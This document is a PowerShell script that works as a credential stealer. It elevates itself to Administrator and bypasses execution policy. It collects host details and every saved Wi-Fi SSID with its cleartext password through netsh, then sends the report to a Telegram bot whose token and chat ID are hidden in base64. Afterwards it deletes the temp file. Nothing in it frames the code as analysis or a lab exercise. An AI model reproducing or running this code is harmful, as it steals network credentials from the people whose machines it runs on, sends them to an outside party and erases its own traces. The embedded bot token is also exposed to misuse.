# ========== CONFIG ==========
$VerboseMode = $true   # Set $true to enable Write-Host

# ========== BASE64 CONFIG ==========
$BotToken_B64 = "ODAzMTQzNTU3NjpBQUV4SnkwQ1JkdHlFR3lpbl9iNjRUMDlPZmpIai1HOFUycw=="
$ChatID_B64 = "MTg0OTI2OTcwOA=="

# Decode at runtime
$BotToken = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($BotToken_B64))
$ChatID = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ChatID_B64))

# Telegram endpoint
$SendDocURL = "https://api.telegram.org/bot$BotToken/sendDocument"

# ========== ADMIN CHECK ==========
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Write-Host "Relaunching as Administrator..."
    Start-Process -FilePath powershell -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"" -Verb RunAs
    exit 1
}


# ========== LOG FUNCTION ==========
function Write-Log { param([string]$Message); if ($VerboseMode) { Write-Host $Message } }

# ========== GATHER PC INFO ==========
$computer = $env:COMPUTERNAME
$cs = Get-CimInstance Win32_ComputerSystem
$model = ($cs.Model).Trim()
$cpu = (Get-CimInstance Win32_Processor).Name
$cores = (Get-CimInstance Win32_Processor).NumberOfCores
$osCaption = (Get-CimInstance Win32_OperatingSystem).Caption.Trim()
$dateTime = (Get-Date).ToString("yyyy-MM-dd HH-mm-ss")

$pcInfoHeader = @"
=============================
$computer
$model
$cpu
C$cores
OS: $osCaption
Date: $dateTime
=============================
"@

# ========== EXTRACT WIFI PASSWORDS ==========
$profiles = netsh wlan show profiles 2>$null |
Select-String "All User Profile" |
ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() } | Sort-Object -Unique

$wifiInfo = @()
if ($profiles.Count -eq 0) {
    $wifiInfo += ""
}
else {
    foreach ($p in $profiles) {
        $info = netsh wlan show profile name="$p" key=clear 2>$null
        $keyLine = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
        if (-not $keyLine) { $keyLine = "<No password saved or open network>" }
        $wifiInfo += "SSID: $p`nPASS: $keyLine`n---"
    }
}

# ========== CREATE TEMP FILE ==========
$fileName = "$computer - netshreport - $dateTime.txt"
$tempFile = Join-Path $env:TEMP $fileName

$pcInfoHeader | Out-File -FilePath $tempFile -Encoding UTF8
$wifiInfo | Out-File -FilePath $tempFile -Encoding UTF8 -Append

# ========== SEND TO TELEGRAM ==========
try {
    $boundary = [guid]::NewGuid().ToString()
    $LF = "`r`n"
    $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)

    $body = "--$boundary$LF"
    $body += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$ChatID$LF"
    $body += "--$boundary$LF"
    $body += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF"
    $body += "Content-Type: text/plain$LF$LF"

    $bodyBytes = [Text.Encoding]::UTF8.GetBytes($body)
    $endBytes = [Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")
    $payload = $bodyBytes + $fileBytes + $endBytes

    $wc = New-Object Net.WebClient
    $wc.Headers["Content-Type"] = "multipart/form-data; boundary=$boundary"

    $wc.UploadData($SendDocURL, "POST", $payload) | Out-Null
    Write-Log ""
}
catch {
    Write-Log " $($_.Exception.Message)"
}
finally {
    if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
}



